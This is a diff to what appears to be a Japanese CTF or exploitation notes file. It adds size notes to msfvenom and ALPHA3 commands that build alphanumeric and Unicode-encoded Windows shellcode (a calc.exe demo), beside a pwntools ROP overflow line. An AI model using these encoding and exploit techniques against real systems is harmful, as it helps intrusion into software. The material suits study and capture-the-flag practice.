@@ -2371,9 +2371,12 @@ conn.sendlineafter("ID: ", "A"*40 + rop.chain() )
 
 ```
 - `msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw > calc.bin`   
+200バイトくらい。   
 - `python /opt/alpha3/ALPHA3.py x86 utf-16 uppercase eax --input="calc.bin"  --verbose`   
 動作は以下の説明と同じ。   
+1000バイトくらい。でかい。   
 - `msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/unicode_upper BufferRegister=EAX -f py`   
+500バイトくらい。   
 シェルコード実行前にEAXにそのシェルコードの先頭アドレスを保存できている場合、`BufferRegister=EAX`を指定する。   
 すると、シェルコードの実行してすぐの処理の、「現在位置をスタック上に保存することでデコーダの場所を特定する」処理が
 必要なくなる！   
